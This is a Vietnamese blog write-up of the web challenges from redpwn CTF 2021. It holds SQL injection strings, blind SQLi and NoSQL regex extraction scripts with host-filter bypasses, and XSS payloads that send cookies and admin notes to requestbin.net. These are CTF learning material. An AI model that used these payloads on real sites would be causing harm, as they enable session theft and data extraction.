---
layout: post
title: "[WRITEUP REDPWN CTF 2021]: WEB"
categories: CTF
toc: true
---

Dưới đây là một số challenge mà mình giải quyết được và ở CTF lần này mình cũng chỉ giải được 7/13, có lẽ do kiến thức mình vẫn đang còn yếu nên các bài sau mình chưa có thể giải quyết được. Mong các bạn đọc tham khảo và đừng ném đá nhé :(

Nếu bài nào có source code thì mình sẽ bỏ ở đây, các bạn có thể tải nó về nhé
[SOURCE](https://github.com/DauHoangTai/CTF/tree/master/2021/Redpwn)
## Challenge inspect-me
Ở bài này thì phần description đã nhắc đến là flag ở vẫn mã nguồn => chúng ta chỉ cần bật mã nguồn lên và tìm thử nó xem sao.

### Solution
Bật mã nguồn lên và Ctrl+F và tìm format flag là `flag{` thì chúng ta tìm được flag `flag{inspect_me_like_123}`.

## Challenge orm-bad
Ở bài này thì chúng ta được cung cấp một file `app.js` vì vậy ta thử mở nó lên đọc xem nó hoạt động như nào.
Đọc sơ qua source thì chúng ta thấy được 
```js
 crypto.randomBytes(32, (err, buf) => {
// if you managed to make this error you deserve it
if (err) {
    throw err;
}
db.all("INSERT INTO users VALUES ('admin', $1)", [buf.toString('hex')]);
console.log("Admin password: " + buf.toString('hex'));
```
Ở đoạn code này thì trong db có chứa account admin và password sẽ được random. Tiếp tục thấy có 1 router là `/flag` và đọc thì thấy nếu như chúng ta có thể đăng nhập với admin thì sẽ có flag, được thể hiện ở đoạn code dưới đây
```js
db.all("SELECT * FROM users WHERE username='" + req.body.username + "' AND password='" + req.body.password + "'", (err, rows) => {
try {
	if (rows.length == 0) {
	            res.redirect("/?alert=" + encodeURIComponent("you are not admin :("));
	        } else if(rows[0].username === "admin") {
	            res.redirect("/?alert=" + encodeURIComponent(flag));
	        } else {
	            res.redirect("/?alert=" + encodeURIComponent("you are not admin :("));
	        }
}
```
Chú ý vào câu query thì thấy được đầu vào không được filter hay block gì cả => ez sql injection.

### Solution
Vậy bây giờ chúng ta chỉ cần cho username=admin và set password trả về true là được

### Payload
```
username=admin&password=' or True -- -
```
Flag -> `flag{sqli_overused_again_0b4f6}`

## Challenge pastebin-1
Chúng ta được cung cấp 1 file RUST là `main.rs` => trang web này được viết bằng RUST. Đọc source thì thấy có function create có chức năng sẽ nhận vào một content tiếp tục. content không được filter hay block gì.
Và ở description tác giả có nhắc đến cookie admin vậy có lẽ là xss.

### Solution
Thử payload trigger xss như `<script>alert(1);</script>` => thành công. Vậy bây giờ chúng ta chỉ cần get cookie admin và cũng như đó là flag.

### Payload
```js
<script>document.location="http://requestbin.net/r/gkwyrn0t?cc="+btoa(document.cookie)</script>
```
Copy url /view?id của các bạn và send cho bot để visit. Cuối cùng base64 decode chuỗi nhận được sẽ có flag
flag -> `flag{d1dn7_n33d_70_b3_1n_ru57}`

## Challenge secure
```js
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```
Chú ý vô code trên thì thấy trong db có chứa account admin là username=base64 encode của admin và password là base64 encode của chuỗi random.
Ở router `/login`
```js
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;

    if (id) return res.redirect(`/?message=${process.env.FLAG}`);
```
câu query trên truyền trực tiếp username và password là 2 cái chúng ta có thể control đc mà không bị filter bất cứ thứ gì => ez sql injection
Nhưng đời không như là mơ có một script xử lý username và password ở phía client 
```js
const username = document.createElement('input');
        username.setAttribute('name', 'username');
        username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );

        const password = document.createElement('input');
        password.setAttribute('name', 'password');
        password.setAttribute('value',
          btoa(document.querySelector('#password').value)
        );
```
nó sẽ base64 encode username và password mình nhập vào rồi sau đó mới mang đi xử lý.

### Solution
Vậy bây giờ mình chỉ cần sử dụng burp để bắt request đoạn base64 encode data của mình gửi lên và sửa password trả về true thì ez có flag :)

### Payload
![image](https://user-images.githubusercontent.com/54855855/125384444-21323b00-e3c3-11eb-9bae-ea1d026ff4f8.png)
Flag -> `flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}`

## Challenge cool
Bài này tiếp tục lại là sql injection nhưng khó hơn các bài bài trước một xíu. Tiếp tục với việc đọc code được cung cấp. Mình sẽ tập trung vào 3 router chính đó là `/login`, `/register`, `/message`.
Thì đầu tiên là `/login`, chương trình nhận vô 2 tham số `username` và `password` sau đó truyền 2 tham số đó vô hàm `check_login()`, nếu như đăng nhập thành công thì redirect tới `/message`.
Hàm `check_login()`
```py
if any(c not in allowed_characters for c in username):
        return False
    correct_password = execute(
        f'SELECT password FROM users WHERE username=\'{username}\';'
    )
    if len(correct_password) < 1:
        return False
    return correct_password[0][0] == password
```
Nếu như username nhập vô chứa các kí tự khác ngoài `allowed_characters` => return false. (allowed_characters được khai báo ở đầu code chỉ cho các kí tự `a-zA-Z0-9`)
Kiếm tra password trong db và và password nhập vào đúng thì trả về true. Vậy ở đây có thể thấy được có thể sql injection ở username nhưng username đã bị block các kí tự khác ngoài các kí tự ở trên nên không thể escape.
Router `/register` có gọi hàm `create_user` được thể hiện dưới đây
```py
if any(c not in allowed_characters for c in username):
        return (False, 'Alphanumeric usernames only, please.')
    if len(username) < 1:
        return (False, 'Username is too short.')
    if len(password) > 50:
        return (False, 'Password is too long.')
    other_users = execute(
        f'SELECT * FROM users WHERE username=\'{username}\';'
    )
    if len(other_users) > 0:
        return (False, 'Username taken.')
    execute(
        'INSERT INTO users (username, password)'
        f'VALUES (\'{username}\', \'{password}\');'
    )
    return (True, '')
```
Tiếp tục username được check các kí tự cho phép và password không check các kí tự nào được phép, password chỉ check độ dài length > 50 thì return false. Query INSERT INTO đưa thẳng username và password vào => có thể sql injection ở password.
Để có được flag thì chúng ta cần đăng nhập vô tài khoản có tên là `ginkoid` và tài khoản này được tạo khi start server.

### Solution
Vì bài này sử dụng sqlite nên chúng ta sử dụng `||` để nối chuỗi. Idea là đăng kí username bất kì và substr password của ginkoid. Sau đó login với username đó và password chạy từ a-zA-Z0-9 nếu như login thành công thì chữ cái đó là password của `ginkoid` và tiếp tục như thế đến hết.
Password chỉ không được vượt quá 51 nên chúng ta không thể sử dụng `'||(select substr(password,1,1)from users) limit 1||'`, nhưng vì acccout `ginkoid` ở đầu tiên trong db nên chúng ta chỉ cần `'||(select substr(password,1,1)from users)||'` thì nó sẽ tự động lấy record đầu tiên trong table.

### Payload
```py
import string
import requests
from random import SystemRandom

#nwinY6GFBqOLn55vInCFnraPJzjFZhYw
#flag{44r0n_s4ys_s08r137y_1s_c00l}
rand = SystemRandom()
list_char = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789')
passwd = ''

def create_user(username,i):
    url1 = 'https://cool.mc.ax/register'
    data = {'username':username,'password':f"'||(select substr(password,{i},1)from users)||'"}
    # print(data)
    r = requests.post(url=url1, data=data)
    # print(r.text)
    print('done')

def login():
    global passwd

    url2 = 'https://cool.mc.ax/'
    for char in string.ascii_letters+string.digits:
        # print(passwd + char, end='\r')
        data = {'username':username,'password':char}
        # print(data)
        r = requests.post(url=url2, data=data)
        # print(r.text)
        if 'You are logged in' in r.text:
            passwd += char
            print(passwd)
            break
    else:
        pass

for i in range(1,33):
    username = ''.join([rand.choice(list(list_char)) for _ in range(32)])
    create_user(username,i)
    login()
```
Cuối cùng đăng nhập `username=ginkoid&password=nwinY6GFBqOLn55vInCFnraPJzjFZhYw`
flag -> `flag{44r0n_s4ys_s08r137y_1s_c00l}`

## Challenge Requester
Đầu tiên được cung cấp một source code java nên vì vậy cần 1 tool decompiler. Ở đây mình sử dụng [jd-gui](https://github.com/java-decompiler/jd-gui).
Sau khi decompiler thì sẽ bắt đầu đọc và hiểu follow của code. Có 3 router chính ở trang web này là `/` -> index.jts (trang chủ), `/createUser` -> tạo user, `testAPI` -> call API. Cả 3 router này đều được sử dụng method GET
Router `/createUser` gọi đến function createUser nằm trong class Handlers. 
```java
String username = (String)ctx.queryParam("username", String.class).get();
    String password = (String)ctx.queryParam("password", String.class).get();
    try {
      Main.db.createDatabase(username);
      Main.db.createUser(username, password);
      Main.db.addUserToDatabase(username, username);
      JSONObject flagDoc = new JSONObject();
      flagDoc.put("flag", Main.flag);
      Main.db.insertDocumentToDatabase(username, flagDoc.toString());
      ctx.result("success");
    } catch (Exception e) {
      throw new InternalServerErrorResponse("Something went wrong");
    } 
  }
```
Folow code nào này sẽ như sau: nhận tham số username và password sau đó gọi 4 fucntion nằm trong class Database là `createDatabase`, `createUser`, `addUserToDatabase`, `insertDocumentToDatabase`.
Để hiểu rõ follow các function trên thì các bạn có thể mở code lên đọc tìm hiểu từ từ, ở đây mình chỉ nói qua là ở router `/createUser` này sẽ có nhiệm vụ tạo database name là username của bạn nhập vào, tạo user với username và password sau đó add flag vào account mình tạo (có nghĩa là sau khi tạo account thì flag sẽ nằm trong account của mình) và flag nằm ở cột là `flag`.
Router `/testAPI` gọi đến function `testAPI` ở class Handlers
```java
String url = (String)ctx.queryParam("url", String.class).get();
    String method = (String)ctx.queryParam("method", String.class).get();
    String data = ctx.queryParam("data");
    try {
      URL urlURI = new URL(url);
      if (urlURI.getHost().contains("couchdb"))
        throw new ForbiddenResponse("Illegal!"); 
    } catch (MalformedURLException e) {
      throw new BadRequestResponse("Input URL is malformed");
    } 
    try {
      if (method.equals("GET")) {
        JSONObject jsonObj = HttpClient.getAPI(url);
        String str = jsonObj.toString();
      } else if (method.equals("POST")) {
        JSONObject jsonObj = HttpClient.postAPI(url, data);
        String stringJsonObj = jsonObj.toString();
        if (Utils.containsFlag(stringJsonObj))
          throw new ForbiddenResponse("Illegal!"); 
      } else {
        throw new BadRequestResponse("Request method is not accepted");
      } 
    } catch (Exception e) {
      throw new InternalServerErrorResponse("Something went wrong");
    } 
    ctx.result("success");
  }
```
Ở router này thì nhận vào url và method, url phải hợp lệ và không được chứa `couchdb`, method thì có 2 lựa chọn là GET và POST. Điều chú ý là khi request lên với url thì nó sẽ chỉ rertun về cho chúng ta là success hoặc mấy throw chứ không trả về reponse content cho mình. Mà ở method POST thì nếu như reponse có chứa full flag thì trả về `Illegal!`.

### Solution
Thì đầu tiên ở đây chúng ta cần bypass được đoạn `urlURI.getHost().contains("couchdb")` và được biết flag được lưu trong couchdb nên vô docs của couchdb đọc và tìm thấy API `{db}/_find` [document](https://docs.couchdb.org/en/stable/api/database/find.html) => chúng ta có thể sử dụng `selector ` và regex để blind (nosql injection)
- Để bypass `couchdb` thì do hàm `.contains` chỉ đúng khi chuỗi đưa vào đúng 100% với chuỗi lọc => chúng ta chỉ cần thay một kí tự in ra trong couchdb thì có thế bypass.
- Dùng regex để blind các kí tự có trong flag. Nếu như kí tự đó đúng thì sẽ trả về 500.

### Payload
Step 1: tạo user thông qua `createUser` -> `https://requester.mc.ax/createUser?username=taidh&password=taidh`
Step 2: Mình đã viết 1 đoạn script để thực hiện việc blind này.
```py
import string
import requests
import json

url = 'https://requester.mc.ax/testAPI'
flag = ''

for i in range(1,50):
    for char in string.ascii_letters+string.digits+'{}_':
        print(char,end="\r")
        temp = flag + char
        params = {"url":"http://taidh1:taidh1@Couchdb:5984/taidh1/_find","method":"POST","data":json.dumps({"selector":{"flag":{"$regex":f"^{temp}"}}})}
        r = requests.get(url=url,params=params)
        # print(r.text)
        if "Something went wrong" in r.text:
            flag += char
            print(flag)
            break
```
Flag -> `flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}`

## Challenge requester-strikes-back
Ở chall này thì follow code vẫn giống như bài Requester. Chỉ có một đoạn chỗ check host là được thay đổi và cách bypass của mình đã sài ở chall Requester không sài được ở bài này.
```java
if (urlURI.getHost().toLowerCase().contains("couchdb"))
        throw new ForbiddenResponse("Illegal!"); 
      String urlDecoded = URLDecoder.decode(url, StandardCharsets.UTF_8);
      urlURI = new URL(urlDecoded);
      if (urlURI.getHost().toLowerCase().contains("couchdb"))
        throw new ForbiddenResponse("Illegal!"); 
```
-> Lần này thì sẽ toLowerCase sau đó mới check, cũng như là chhặn luôn viện sử dụng unicode.
Vì ở chall Requester mình stuck khá lâu nên mình cứ nghĩ là sai ở chỗ check host nên mình cứ chăm chăm vào đó và thành ra tìm được cách vượt được check host của bài này luôn :)).

### Solution
Sử dụng %00 để bypass check host còn phần sau vẫn như bài trước.

### Payload
```py
import string
import requests
import json

url = 'https://requester-strikes-back.mc.ax//testAPI'
flag = ''

for i in range(1,50):
    for char in string.ascii_letters+string.digits+'{}_':
        print(char,end="\r")
        temp = flag + char
        params = {"url":"http://taidh1:taidh1@couchdb%00@cc:5984//taidh1/_find","method":"POST","data":json.dumps({"selector":{"flag":{"$regex":f"^{temp}"}}})}
        r = requests.get(url=url,params=params)
        # print(r.text)
        if "Something went wrong" in r.text:
            flag += char
            print(flag)
            break
```
- Mình cũng thấy có một số payload được các bạn share lên như `@%63ouchdb%3a5984@lol`

## Challenge notes
Mình sẽ không phân tích code từng đoạn một mà sẽ nói sơ qua follow code của bài này và chỗ exploit nhé. Chương trình có phần register và login nhưng các đoạn đó chỉ là code bình thường và mình không phát hiện lỗi trong đó.
Có 3 router chính là `/api/notes`, `api/notes/}${user}` và `/view/${user}`
File `modules/api-plugin.js`
```js
db.register('admin', crypto.randomBytes(32).toString('hex'));
db.addNote('admin', {
  body: process.env.FLAG,
  tag: 'private',
});
```
Đoạn code trên thì chúng ta có thể thấy được flag nằm trong body của account admin.
File `view/index.js`
```js
for (const note of notes) {
    // this one is controlled by user, so prevent xss
    const body = note.body
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll('\'', '&#39;');
    // this one isn't, but make sure it fits on page
    const tag =
      note.tag.length > 10 ? note.tag.substring(0, 7) + '...' : note.tag;
    // render templates and put them in our array
    const rendered = populateTemplate(template, { body, tag });
    renderedNotes.push(rendered);
  }
```
Đoạn code trên là sau khi nhận tham số `body` và `tag`. Ở body nếu có chứa các `<>"'` thì sẽ bị replace với các HTML entities tương ứng. tag thì không bị filter nhưng bị check length, không được vượt quá 10, nếu > 10 thì chỉ lấy 7 kí tự và cộng thêm ...

### Solution
- Như ở trên đã phân tích thì chỉ ở body mới bị replace các dấu có thể xss còn tag thì không => dựa vô tag để xây dựng payload xss.
- Nhưng tag không thể vượt 10 kí tự nên không thể viết payload xss 1 lần vô tag luôn mà chúng ta phải chain các tag lại với nhau thành 1 payload xss tưng ứng (mỗi lần gửi length tag sẽ nhỏ <= 10).
- flag ở body của admin nên chúng ta cần fetch tới `/api/notes/admin` để đọc flag.
- Cuối cùng gửi `/view/$user` cho bot visit.

### Payload
```js
{"body":"","tag":"<style a='"}
{"body":"","tag":"'onload='`"}
{"body":"`;fetch(`/api/notes/admin`).then(r=>r.text()).then(t=>fetch(`https://requestbin.net/r/e34po5o2?cc=`+btoa(t)));`","tag":"`;'/>"}
```
accout của mình đây là `taidh4` => gửi link cho bot là `https://notes.mc.ax/view/taidh4`
Flag -> `flag{w0w_4n07h3r_60lf1n6_ch4ll3n63}`

## Lời kết
Qua redpwn lần này mình học thêm được nhiều thứ cũng như có thể ôn luyện lại các kiến thức mình đã có. Cảm ơn các bạn đã đọc, hẹn các bạn ở các CTF tiếp theo :))